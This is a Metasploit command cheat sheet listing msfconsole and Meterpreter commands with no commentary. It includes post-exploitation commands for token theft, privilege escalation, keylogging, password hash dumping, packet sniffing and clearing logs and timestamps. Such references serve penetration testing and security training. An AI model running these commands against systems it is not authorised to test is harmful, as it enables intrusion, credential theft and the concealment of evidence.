# Metasploit

## MSFconsole Commands

### Module and Payload Navigation

```bash
show exploits
show payloads
show auxiliary
search <name>
info
use <name>
use <number>
```

### Setting Options

```bash
set LHOST <ip>
set RHOST <ip>
set <option> <value>
setg <option> <value>
show options
show targets
set target <number>
set payload <payload>
show advanced
```

### Running Exploits

```bash
check
exploit
exploit -j
exploit -z
exploit -e <encoder>
exploit -h
```

### Session Management

```bash
sessions -l
sessions -v
sessions -s <script>
sessions -K
sessions -c <cmd>
sessions -u <sessionID>
```

### Database Integration

```bash
db_create <name>
db_connect <name>
db_nmap <args>
db_destroy
```

## Meterpreter Commands

### General

```bash
help
run <scriptname>
sysinfo
ls
```

### Privilege Tools

```bash
use priv
ps
migrate <pid>
use incognito
list_tokens -u
list_tokens -g
impersonate_token <DOMAIN\\USERNAME>
steal_token <pid>
drop_token
getsystem
```

### Shell and Execution

```bash
shell
execute -f <cmd.exe> -i
rev2self
```

### Registry

```bash
reg <command>
```

### Desktop Interaction

```bash
setdesktop <number>
screenshot
```

### File Operations

```bash
upload <file>
download <file>
```

### Keylogging

```bash
keyscan_start
keyscan_dump
keyscan_stop
```

### Privilege Information

```bash
getprivs
```

### UI Control

```bash
uictl enable <keyboard/mouse>
```

### Session Control

```bash
background
```

### Hashes

```bash
hashdump
```

### Sniffer Module

```bash
use sniffer
sniffer_interfaces
sniffer_start <id> <packet-buffer>
sniffer_dump <id> <filename>
sniffer_stop <id>
```

### Logs and Timestamps

```bash
clearev
timestomp
```

### System Control

```bash
reboot
```
